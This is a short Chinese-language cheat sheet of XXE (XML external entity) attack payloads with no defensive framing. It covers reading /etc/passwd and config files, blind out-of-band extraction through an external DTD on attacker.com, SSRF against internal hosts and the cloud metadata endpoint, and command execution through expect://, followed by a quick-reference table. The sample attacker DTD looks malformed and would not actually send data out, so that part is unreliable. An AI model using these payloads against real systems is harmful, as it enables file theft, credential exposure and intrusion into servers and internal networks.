# XXE攻击链

## 基础文件读取

### 1. 探测XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### 2. 读取敏感文件

```
file:///etc/passwd
file:///var/www/html/config.php
file:///C:/windows/win.ini
```

---

## Blind XXE → 外带数据

### 1. 构造外带Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo></foo>
```

### 2. 攻击者服务端准备

```
# xxe.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "data://text/plain,%file;">
```

---

## XXE → SSRF

### 1. 内网探测

```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/secret">
```

### 2. 云元数据

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

---

## XXE → RCE

### expect协议

```xml
<!ENTITY xxe SYSTEM "expect://whoami">
```

---

## 攻击链速查

| 目标 | Payload | 说明 |
|------|---------|------|
| 文件读取 | `file:///etc/passwd` | 基础利用 |
| Blind XXE | 外带DTD | 隐蔽利用 |
| SSRF | `http://internal` | 内网探测 |
| RCE | `expect://cmd` | 代码执行 |
